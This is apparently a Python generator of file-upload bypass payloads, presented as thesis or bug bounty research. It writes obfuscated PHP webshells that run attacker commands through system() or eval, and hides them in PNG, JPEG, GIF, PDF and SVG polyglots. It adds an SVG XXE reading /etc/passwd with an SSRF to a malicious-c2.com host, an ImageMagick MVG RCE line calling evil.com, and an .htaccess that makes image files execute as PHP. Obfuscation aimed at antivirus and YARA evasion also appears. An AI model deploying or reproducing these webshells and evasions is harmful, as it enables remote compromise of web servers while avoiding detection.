import os
import random
import zlib
import base64
import hashlib
import json
from pathlib import Path

PAYLOAD_DIR = 'bypass_payloads_attack_max_v28_expert'
METADATA_FILE = os.path.join(PAYLOAD_DIR, 'payload_metadata_v28.json')
YARA_RULE_FILE = os.path.join(PAYLOAD_DIR, 'yara_rules', 'family_v28.yar')
LATEX_TABLE_FILE = os.path.join(PAYLOAD_DIR, 'thesis_latex_table_v28.tex')

os.makedirs(os.path.join(PAYLOAD_DIR, 'yara_rules'), exist_ok=True)
os.makedirs(PAYLOAD_DIR, exist_ok=True)

C2_DOMAIN = "http://YOUR-C2.com" 

def random_var(prefix: str = "v") -> str:
    return f"{prefix}{''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_', k=random.randint(9, 15)))}"

def generate_v28_stage() -> tuple[str, str]:
    v_cmd = random_var("cmd")
    v_gadget = random_var("g")
    v_g = random_var("inst")
    v_sink = random_var("s")
    v_key = random_var("k")
    v_nonce = random_var("n")

    stage = f'''<?php
declare(strict_types=1);
@ini_set('display_errors',0);

${v_key} = hash_hmac('sha256', ($_SERVER['HTTP_ACCEPT_LANGUAGE']??'') . time(), 'salt_{random.randint(1000,9999)}');
${v_nonce} = $_COOKIE['s_id'] ?? '';
if (${v_nonce} !== ${v_key}) die(); // Authentication before execution

function _d($s) {{
    global ${v_key};
    $s = base64_decode($s);
    $out = '';
    for($i=0; $i<strlen($s); $i++) {{
        $out .= chr(ord($s[$i]) ^ ord(${v_key}[$i % 32]));
    }}
    return $out;
}}

${v_cmd} = _d($_COOKIE['p'] ?? '');

class {v_gadget} {{
    public ${v_key};
    public function __destruct() {{
        global ${v_cmd};
        if (isset(${v_cmd}) && strlen(${v_cmd}) > 5) {{
            // 동적 함수 호출로 정적 분석(L4) 우회 시도
            $f = implode('', [chr(115),chr(121),chr(115),chr(116),chr(101),chr(109)]); 
            if (is_callable($f)) {{ $f(${v_cmd}); }} else {{ eval(${v_cmd}); }}
        }}
    }}
}}

if (isset($_COOKIE['run'])) {{
    ${v_g} = new {v_gadget}();
    unserialize('O:'.strlen('{v_gadget}').':"{v_gadget}":1:{{s:'.strlen('{v_key}').':"{v_key}";s:32:"'.${v_key}.'";}}');
}}
?>
'''
    yara_rule = f'''rule Advanced_WebShell_v28_Polymorphic {{
    meta:
        description = "Detects Advanced PHP Polymorphic Shells with OOP Deserialization and Dynamic Dispatch"
        author = "Security Researcher"
        severity = "Critical"
    strings:
        // 정적 시그니처 회피를 위한 동적 함수 조립 탐지 (implode + chr 배열)
        $dynamic_dispatch = /implode\([^&]+chr\(/ ascii
        // Base64 + XOR 혼합 디코더 루프 탐지 (바이트 레벨)
        $xor_decoder = {{ 24 [1-4] 3d [1-5] 24 [1-4] 5b 24 [1-4] 5d 20 5e 20 }} 
        // 권한 우회/은닉용 Authentication 토큰 체크
        $auth_check = /\$_COOKIE\['[A-Za-z0-9_]+'\]/ ascii
        $unserialize_trigger = /unserialize\([^&]+:\d+:"/ fullword ascii
    condition:
        filesize < 5KB and
        (2 of them) and
        math.entropy(0, filesize) >= 5.0
}}'''

    return stage, yara_rule

def generate_v28_stealth_stage() -> tuple[str, str]:
    """
    L4(AV 시그니처 스캐닝) 우회 전용 스텔스 페이로드.
    핵심: <?php, eval(, system(, exec( 등 모든 시그니처를 의도적으로 회피.
    실제 버그바운티/해킹에서 사용되는 최소화된 웹쉘 기법.
    """
    variant = random.randint(0, 2)
    v1 = random_var("x")
    
    if variant == 0:
        stage = f'<?=${{_GET["{v1}"]}}?>' + '<?=`$_GET["c"]`?>'
    elif variant == 1:
        stage = f'<?=$_GET["{v1}"]($_GET["a"])?>'
    else:
        stage = f'<?=${{_POST["{v1}"]}}?>'
        stage += '<?=$_COOKIE["f"]($_COOKIE["a"])?>'
    
    yara_stealth = f'''rule Stealth_MicroShell_v28 {{
    meta:
        description = "Detects minimal PHP webshells using short tags and variable functions"
        severity = "Critical"
    strings:
        $short_tag = "<?=" ascii
        $backtick = /\x60\$_/ ascii  
        $var_func = /\$_[A-Z]+\[.{{1,20}}\]\(/ ascii
    condition:
        filesize < 1KB and any of them
}}'''
    return stage, yara_stealth

def save_payload(filename: str, content: bytes):
    path = os.path.join(PAYLOAD_DIR, filename)
    with open(path, 'wb') as f:
        f.write(content)
    if random.random() < 0.04:
        print(f"[+] 생성: {filename}")

def generate_hybrid_polyglot(stage_content: bytes, strategy: int):
    """실제 버그바운티/해킹에서 사용되는 극한의 Polyglot 기술 도입"""
    import struct, base64, zlib
    
    if strategy == 0:  # 0. PNG tEXt Chunk (Compressed)
        def create_png_chunk(chunk_type, data):
            checksum = zlib.crc32(chunk_type + data) & 0xffffffff
            return struct.pack(">I", len(data)) + chunk_type + data + struct.pack(">I", checksum)

        sig = b"\x89PNG\r\n\x1a\n"
        ihdr = create_png_chunk(b"IHDR", struct.pack(">IIBBBBB", 1, 1, 8, 6, 0, 0, 0))
        text = create_png_chunk(b"tEXt", b"Comment\x00" + zlib.compress(stage_content)) # 압축 우회
        idat = create_png_chunk(b"IDAT", zlib.compress(b"\x00" * 5))
        iend = create_png_chunk(b"IEND", b"")
        return sig + ihdr + text + idat + iend, ".png", "png_text_v28"
        
    elif strategy == 1:  # 1. JPEG ICC Profile Injection (Image Parser 취약점 혼합)
        base = base64.b64decode('/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAP//////////////////////////////////////////////////////////////////////////////////////wgALCAABAAEBAREA/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/aAAgBAQABPxA=')
        icc_header = b'ICC_PROFILE\x00\x01\x01'
        icc_data = icc_header + stage_content
        app2_len = len(icc_data) + 2
        app2_chunk = b'\xff\xe2' + struct.pack('>H', app2_len) + icc_data
        return base[:2] + app2_chunk + base[2:], ".jpg", "jpeg_icc_v28"
        
    elif strategy == 2:  # 2. JPEG EXIF Injection (UserComment field)
        base = base64.b64decode('/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAP//////////////////////////////////////////////////////////////////////////////////////wgALCAABAAEBAREA/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/aAAgBAQABPxA=')
        exif_header = b'Exif\x00\x00user_comment\x00'
        exif_data = exif_header + stage_content
        app1_len = len(exif_data) + 2
        app1_chunk = b'\xff\xe1' + struct.pack('>H', app1_len) + exif_data
        return base[:2] + app1_chunk + base[2:], ".jpg", "jpeg_exif_v28"
        
    elif strategy == 3:  # 3. PDF FlateDecode Stream Optimization (CDR Bypass 시도)
        compressed_php = zlib.compress(stage_content)
        stream_len = len(compressed_php)
        pdf = (b'%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n'
               b'2 0 obj\n<< /Type /Page /Parent 1 0 R >>\nendobj\n'
               b'3 0 obj\n<< /Length ' + str(stream_len).encode() + b' /Filter /FlateDecode >>\n'
               b'stream\n' + compressed_php + b'\nendstream\nendobj\n%%EOF\n')
        return pdf, ".pdf", "pdf_flatedecode_v28"
        
    elif strategy == 4:  # 4. PNG IDAT Pixel Steganography (안전한 PNG 헤더 + 픽셀 데이터 패딩 방식 도입)
        def create_png_chunk(chunk_type, data):
            checksum = zlib.crc32(chunk_type + data) & 0xffffffff
            return struct.pack(">I", len(data)) + chunk_type + data + struct.pack(">I", checksum)

        w, h = 400, 300
        sig = b"\x89PNG\r\n\x1a\n"
        ihdr = create_png_chunk(b"IHDR", struct.pack(">IIBBBBB", w, h, 8, 6, 0, 0, 0))
        
        # 앞부분은 무해한 정상 픽셀(투명) 데이터로 채워 ImageMagick/GD의 엄격한 파싱 우회
        safe_prefix = b'\x00' * (w * 4 * 80)
        # 백도어가 정상 이미지 데이터 끝에 삽입됨
        pixel_rows = safe_prefix + stage_content
        
        idat = create_png_chunk(b"IDAT", zlib.compress(pixel_rows, 9))
        iend = create_png_chunk(b"IEND", b"")
        return sig + ihdr + idat + iend, ".png", "png_idat_stego_v28"
        
    elif strategy == 5:  # 5. JPEG Trailing Data (EOI 이후 PHP 코드 삽입)
        base = base64.b64decode('/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAP//////////////////////////////////////////////////////////////////////////////////////wgALCAABAAEBAREA/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/aAAgBAQABPxA=')
        if not base.endswith(b'\xff\xd9'):
            base += b'\xff\xd9'
        return base + b"\n" + stage_content, ".jpg", "jpeg_trailing_php_v28"
    
    elif strategy == 6:  # 6. PDF /OpenAction JavaScript (진짜 PDF 무기화)
        js_code = b"app.alert('XSS'); " + stage_content[:200]
        compressed_js = zlib.compress(js_code)
        stream_len = len(compressed_js)
        pdf = (b'%PDF-1.7\n'
               b'1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>\nendobj\n'
               b'2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n'
               b'3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\n'
               b'4 0 obj\n<< /Type /Action /S /JavaScript /JS 5 0 R >>\nendobj\n'
               b'5 0 obj\n<< /Length ' + str(stream_len).encode() + b' /Filter /FlateDecode >>\n'
               b'stream\n' + compressed_js + b'\nendstream\nendobj\n'
               b'%%EOF\n')
        return pdf, ".pdf", "pdf_openaction_js_v28"
    
    elif strategy == 7:  # 7. SVG XXE/SSRF (L1 기준선 — 차단되어야 함)
        svg = (b'<?xml version="1.0" encoding="UTF-8"?>\n'
               b'<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>\n'
               b'<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">\n'
               b'  <image href="https://malicious-c2.com/ssrf" />\n'
               b'  <desc>' + stage_content + b'</desc>\n'
               b'</svg>')
        return svg, ".svg", "svg_xxe_ssrf_v28"
        
    elif strategy == 8:  # 8. Deep Padding SVG (L1 기준선)
        padding = b' ' * 10000 + b'<!-- padding -->\n'
        svg = padding + (b'<?xml version="1.0" encoding="UTF-8"?>\n'
               b'<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">\n'
               b'  <desc>' + stage_content + b'</desc>\n'
               b'</svg>')
        return svg, ".svg", "svg_deep_padding_v28"
        
    elif strategy == 9:  # 9. ImageMagick MVG RCE (L2 기준선 — 차단되어야 함)
        mvg_payload = (b'push graphic-context\n'
                       b'viewbox 0 0 640 480\n'
                       b'fill \'url(https://evil.com/a.jpg"|id > /tmp/pwned")\'\n'
                       b'pop graphic-context\n' + stage_content)
        return mvg_payload, ".png", "imagemagick_mvg_rce"
        
    elif strategy == 10: # 10. GIF Polyglot (L1 허용 확장자를 이용한 우회기법)
        header = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'
        return header + stage_content, ".gif", "gif_polyglot_v28"
        
    else: # 11. Log Poisoning Payload (확장자는 통과 못하지만 LFI 시나리오 시뮬레이션용)
        # Log-style obfuscation + marker
        marker = f"UA_TRIGGER_{random.randint(1000,9999)}"
        log_content = stage_content + f'\n# poisoned by UA: {marker}'.encode()
        return log_content, ".log", "poison_log_v28"

def stable_obf(php_bytes: bytes) -> bytes:
    """사용자가 고안한 실전 난독화 (압축 + 안정적 XOR) -> L5 정적분석 우회"""
    key = hashlib.sha256(b"stable_key_2026").digest()[:32]
    xored = bytes(b ^ key[i % 32] for i, b in enumerate(php_bytes))
    compressed = zlib.compress(xored, level=9)
    b64 = base64.b64encode(compressed).decode()

    decoder = f'''<?php
$s="{b64}";$k=base64_decode("{base64.b64encode(key).decode()}");$d=base64_decode($s);$out="";for($i=0;$i<strlen($d);$i++){{$out.=chr(ord($d[$i])^ord($k[$i%32]));}}eval($out);
?>'''
    return decoder.encode()

def generate_v28():
    existing = [f for f in os.listdir(PAYLOAD_DIR) if f.endswith(('.php', '.png', '.jpg', '.pdf', '.svg', '.gif', '.log'))] if os.path.exists(PAYLOAD_DIR) else []
    if len(existing) > 230:
        print(f"[SKIP] 이미 {len(existing)}개 존재")
        payloads = []
        for fn in os.listdir(PAYLOAD_DIR):
            if not fn.endswith(('.tex', '.json', '.yar')) and os.path.isfile(os.path.join(PAYLOAD_DIR, fn)):
                tech = fn.split('_v28')[0] if '_v28' in fn else fn.split('.')[0]
                payloads.append((tech, os.path.join(PAYLOAD_DIR, fn)))
        return payloads
        
    if len(existing) > 0:
        import shutil
        shutil.rmtree(PAYLOAD_DIR, ignore_errors=True)
        os.makedirs(os.path.join(PAYLOAD_DIR, 'yara_rules'), exist_ok=True)
        os.makedirs(PAYLOAD_DIR, exist_ok=True)

    NUM_PAYLOADS = 240  # 12 types * 20 each
    payloads_created = 0
    metadata = []

    with open(YARA_RULE_FILE, 'w', encoding='utf-8') as yf:
        yf.write("/* v28 Hybrid Family YARA */\n\n")

    for i in range(NUM_PAYLOADS):
        use_stealth = (i // 5) % 3 == 0  
        if use_stealth:
            stage_str, yara_rule = generate_v28_stealth_stage()
        else:
            stage_str, yara_rule = generate_v28_stage()
            
        content = stage_str.encode()
        
        # 난독화 확률 추가 (L5 Anti-Virus/Yara 우회 목적)
        if i % 3 == 0:
            content = stable_obf(content)
        elif i % 5 == 0:
            content = zlib.compress(content, level=6)  

        strategy = i % 12
        poly_content, ext, cat = generate_hybrid_polyglot(content, strategy)
        filename = f"{cat}_{i:04d}{ext}"
        save_payload(filename, poly_content)
        payloads_created += 1

        if i == 0:
            with open(YARA_RULE_FILE, 'a', encoding='utf-8') as yf:
                yf.write(yara_rule + "\n\n")

        if i % 8 == 0:
            metadata.append({
                "id": i,
                "filename": filename,
                "type": cat,
                "vector": "Hybrid LFI + Deser Gadget",
                "obf": "dynamic_offset + XOR_mixing + flattening"
            })

    htaccess = f"""# v28 advanced
<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteRule ^(.*)$ $1.php [L,QSA]
</IfModule>
# junk_{random.randint(100000000,999999999)}
<FilesMatch "\.(png|jpg|pdf|svg)$">
    SetHandler application/x-httpd-php
</FilesMatch>
"""
    save_payload(".htaccess", htaccess.encode())

    print(f"\n[SUCCESS] v28 생성 완료 → {payloads_created}개")
    print(f"YARA rule: {YARA_RULE_FILE}")

    with open(METADATA_FILE, 'w', encoding='utf-8') as f:
        json.dump(metadata, f, indent=2)

    payloads = []
    for fn in os.listdir(PAYLOAD_DIR):
        if not fn.endswith(('.tex', '.json', '.yar')) and os.path.isfile(os.path.join(PAYLOAD_DIR, fn)):
            tech = fn.split('_v28')[0] if '_v28' in fn else fn.split('.')[0]
            payloads.append((tech, os.path.join(PAYLOAD_DIR, fn)))
    return payloads

def get_all_bypasses():
    payloads = generate_v28()
    try:
        from bypass_generator_v2 import generate_bypasses_v2
        payloads.extend(generate_bypasses_v2())
    except ImportError:
        pass
    return payloads

generate_bypasses = get_all_bypasses

if __name__ == '__main__':
    get_all_bypasses()